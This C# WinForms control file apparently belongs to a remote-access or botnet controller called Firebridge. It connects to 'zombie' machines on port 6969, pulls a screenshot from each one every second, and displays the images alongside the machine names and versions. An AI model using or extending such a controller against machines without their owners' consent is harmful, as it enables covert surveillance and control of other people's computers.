using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using FirebridgeShared.Networking;
using System.IO;
using FirebridgeClient.Views;
using FirebridgeShared.Models;

namespace FirebridgeClient.Controls
{
    public partial class ZombieView : UserControl
    {

        private ZombieDetailView detailView;
        public int ScreenShotResolutionMultiplier { get; set; } = 1;
        public int ScreenShotRefreshWaitTime
        {
            get => _screenshotTimer.Interval; set
            {
                _screenshotTimer.Interval = value;
            }
        }
        public string Ip { get => _ip.Text; }
        public string MachineName { get => _machineName.Text; }

        Connection connection;

        bool ImageRequested = false; //dont request another image while we wait for one

        public ZombieView(string ip)
        {

            InitializeComponent();
            ScreenShotRefreshWaitTime = 1000;

            connection = new Connection(new IPEndPoint(IPAddress.Parse(ip), 6969));
            _ip.Text = ip;

            _image.BackColor = ColorTranslator.FromHtml("#34ace0");
            this.BackColor = ColorTranslator.FromHtml("#84817a");

            _image.GetType()
                .GetProperty("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic)
                ?.SetValue(_image, true);

            connection.MessageRecieved += Connection_MessageRecieved;
            connection.Disconnected += Connection_Disconnected; ;

            detailView = new ZombieDetailView(this);
            detailView.Hide();
        }

        private void Connection_Disconnected(object sender, EventArgs e)
        {
            if (this.Disposing || this.IsDisposed)
                return;

            detailView.Dispose();
            this.Dispose();
        }

        public void SendPacket(Packet packet)
        {
            connection.SendPacket(packet);
        }

        public void RequestScreenshot()
        {
            if (ImageRequested)
                return;

            ImageRequested = true;
            connection.SendPacket(new Packet()
            {
                Id = 3,
                Data =
                new ScreenshotRequestModel() { Width = (128 * ScreenShotResolutionMultiplier), Height = (72 * ScreenShotResolutionMultiplier) }
            });
        }

        private void Connection_MessageRecieved(object sender, EventArgs e)
        {
            var packet = (e as MessageEventArgs)?.Packet;

            if (packet == null)
                return;

            if (this.InvokeRequired)
                this.Invoke(new Action(() => this.Connection_MessageRecieved(sender, e)));

            switch (packet.Id)
            {
                case 0:
                    Console.WriteLine((string)packet.Data);
                    break;
                case 3:
                    ImageRequested = false;
                    _image.Image?.Dispose();
                    _image.Image = (Bitmap)packet.Data;
                    detailView?.SetImage((Bitmap)packet.Data);
                    break;
                case 5:
                    _machineName.Text = (string)packet.Data;
                    OnMachineNameChanged(new OnMachineNameChangedEventArgs(_machineName.Text));
                    break;
                case 6:
                    _rev.Text = "Version: " + ((int)packet.Data).ToString();
                    break;
                default:
                    Console.WriteLine("Unknown packet ID: " + packet.Id);
                    Console.WriteLine(((MessageEventArgs)e).Packet.Data.ToString());
                    break;
            }
        }

        private bool selected = false;

        public bool IsSelected
        {
            get => selected;
            set
            {
                if (selected != value)
                {
                    selected = value;
                    OnSelectionChange(new SelectionChangeEventArgs(value));
                }
                else 
                    selected = value;

                if (selected)
                    this.BackColor = ColorTranslator.FromHtml("#ffb142");
                else
                    this.BackColor = ColorTranslator.FromHtml("#84817a");
            }
        }
        protected virtual void OnMachineNameChanged(OnMachineNameChangedEventArgs e)
        {
            MachineNameChanged?.Invoke(this, e);
        }

        public event EventHandler MachineNameChanged;

        protected virtual void OnSelectionChange(SelectionChangeEventArgs e)
        {
            SelectionChange?.Invoke(this, e);
        }

        public event EventHandler SelectionChange;

        private void _image_Click(object sender, EventArgs e)
        {
            IsSelected = !selected;
        }

        private void _buttonDetail_Click(object sender, EventArgs e)
        {
            detailView.Show();
        }

        private void _screenshotTimer_Tick(object sender, EventArgs e)
        {
            RequestScreenshot();
        }
    }
    public class SelectionChangeEventArgs : EventArgs
    {
        public bool Selected { get; set; }
        public SelectionChangeEventArgs(bool selected)
        {
            Selected = selected;
        }
    }

    public class OnMachineNameChangedEventArgs : EventArgs
    {
        public string MachineName { get; set; }
        public OnMachineNameChangedEventArgs(string machineName)
        {
            MachineName = machineName;
        }
    }
}
